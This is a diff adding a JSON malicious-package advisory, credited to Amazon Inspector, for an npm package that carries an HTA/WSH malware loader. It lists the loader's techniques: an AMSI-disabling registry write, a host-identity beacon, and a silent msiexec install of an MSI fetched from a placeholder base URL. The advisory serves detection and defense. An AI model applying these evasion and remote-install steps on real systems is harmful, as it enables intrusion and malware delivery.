@@ -1,0 +1,74 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-09-22T23:14:30Z",
+  "modified": "2026-09-22T23:14:30Z",
+  "summary": "HTA/WSH staged loader: AMSI bypass, host-identity beacon, and silent MSI drop-and-run from runtime-supplied C2",
+  "details": "The package ships a Windows HTA/WSH loader that installs a remote MSI on the victim host under the control of a base URL supplied at runtime via window.__gsutBases. On execution it (1) disables Anti-Malware Scan Interface for Windows Script Host by writing HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable = 0 through both WScript.Shell.RegWrite and WMI StdRegProv.SetDWORDValue, with the value name reconstructed from a split array to evade static detection; (2) reads %COMPUTERNAME% and %USERNAME% via WScript.Shell.ExpandEnvironmentStrings and POSTs them together with phase/exit codes to <base>/v1/hta/event; (3) taskkills python.exe, pythonw.exe, core.exe, guest.exe and enumerates HKLM/HKCU Uninstall keys via WMI to silently msiexec-uninstall any product whose DisplayName equals \"GSUT Guest\" — prior-agent cleanup rather than a benign uninstall; (4) requests a token from <base>/v1/hta/msi-token and invokes msiexec /i \"<base>/guest.msi?t=<tok>\" /qn /norestart REBOOT=ReallySuppress via WScript.Shell.Run, with fallbacks through Shell.Application.ShellExecute and wmic process call create. Every sensitive identifier — ActiveXObject, WScript.Shell, Shell.Application, WbemScripting.SWbemLocator, StdRegProv, AmsiEnable, EtwEventWriteEx, GetProcAddress, GetModuleHandleA, VirtualProtect, MSXML2.ServerXMLHTTP, msiexec, wmic, and the Function constructor used to parse the token response — is reconstructed at runtime from character-array joins or string concatenation to evade signature scanning. The combined behavior (AMSI disablement, host-identity beacon, prior-implant cleanup, silent installation of a remotely fetched MSI from an attacker-supplied base URL, uniform identifier obfuscation) is the fingerprint of an HTA-stage malware loader.",
+  "affected": [
+    {
+      "package": {
+        "name": "@gsutevil/hta-stage",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.62.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/stage.js",
+              "sha256": "b3ce9de41e247304592ca4e9df085d94055bb2bfee35c72e91795e39723c11a7",
+              "tlsh": "e4f18458b9e224a47b7314980b3f7a04f1f31627684dc27074ace8d66f7864a826f7d9"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "hta-stage-1.62.0.tgz",
+              "hashes": {
+                "sha1": "edbb561077d1b0dacc584b110ff8d93fadfd3d5b",
+                "sha512_sri": "sha512-pLKfE7mttPwOu8oSYy7QTLJhSz/mr/dQfuWiRFoQizyOXosi+JKcl9QbSbTcM3jnOUM31fxnAg/NwIW/O/4Lfw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@gsutevil/hta-stage/v/1.62.0"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-020317",
+        "import_time": "2026-09-22T23:15:45.062224709Z",
+        "modified_time": "2026-09-22T23:14:30Z",
+        "sha256": "590b3432b8d849d5772e3be7a4fbc7daeca4aa927be2d411aaf3054d9a223dc9",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.62.0"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
